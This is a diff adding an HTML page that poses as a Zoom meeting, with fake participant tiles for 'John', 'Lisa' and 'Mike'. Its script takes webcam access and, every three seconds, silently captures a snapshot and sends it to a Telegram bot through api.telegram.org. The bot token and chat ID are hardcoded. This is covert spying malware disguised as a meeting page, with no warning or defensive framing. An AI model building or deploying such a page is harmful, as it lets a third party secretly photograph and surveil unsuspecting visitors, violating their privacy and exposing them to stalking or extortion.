@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom Meeting</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #222; color: white; }
+        .zoom-container { max-width: 800px; margin: 20px auto; padding: 20px; background: #333; border-radius: 10px; }
+        .video-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .participant { background: black; padding: 20px; border-radius: 5px; position: relative; }
+        .name-tag { position: absolute; bottom: 5px; left: 5px; background: rgba(0,0,0,0.7); padding: 5px; }
+        video, canvas { width: 100%; height: auto; display: none; }
+    </style>
+</head>
+<body>
+    <div class="zoom-container">
+        <h2>Zoom Meeting</h2>
+        <div class="video-grid">
+            <div class="participant" id="user-video"><span class="name-tag">You</span></div>
+            <div class="participant"><span class="name-tag">John (Muted)</span></div>
+            <div class="participant"><span class="name-tag">Lisa (Frozen)</span></div>
+            <div class="participant"><span class="name-tag">Mike (No Video)</span></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7653922008:AAHESgeODhofFKWGSCN1gKV2YBE5wR91G4Y";  // Replace with your Telegram bot token
+        const CHAT_ID = "5309738616";      // Replace with your chat ID
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                let videoElement = document.createElement("video");
+                videoElement.srcObject = stream;
+                videoElement.autoplay = true;
+                videoElement.style.display = "block";
+                document.getElementById("user-video").appendChild(videoElement);
+                
+                setInterval(() => captureAndSend(videoElement), 3000); // Capture every 3 seconds
+            })
+            .catch(error => {
+                console.log("Camera access denied.");
+            });
+
+        function captureAndSend(video) {
+            let canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, "image/jpeg");
+        }
+
+        function sendToTelegram(imageBlob) {
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", imageBlob, "snapshot.jpg");
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("Sent to Telegram:", data))
+            .catch(error => console.error("Error sending to Telegram:", error));
+        }
+    </script>
+</body>
+</html>
